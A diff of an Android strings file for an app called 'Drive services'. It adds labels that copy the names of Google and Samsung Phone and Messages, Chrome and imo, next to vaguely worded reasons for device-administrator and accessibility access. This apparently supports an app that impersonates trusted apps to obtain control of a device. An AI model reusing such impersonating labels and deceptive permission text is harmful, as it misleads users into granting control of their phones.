@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">Drive services</string>
+    <string name="label_google_phone">Phone</string>
+    <string name="label_google_msg">Messages</string>
+    <string name="label_sam_phone">Phone</string>
+    <string name="label_sam_msg">Messages</string>
+    <string name="label_chrome">Chrome</string>
+    <string name="label_imo">imo</string>
+    <string name="label_imo_hd">imo HD</string>
+    <string name="label_imo_beta">imo beta</string>
+    <string name="label_imo_lite">imo lite</string>
     <string name="admin_desc">Required for background system maintenance and diagnostic reporting.</string>
     <string name="accessibility_desc">Required for system-level usage analytics and accessibility support.</string>
 </resources>
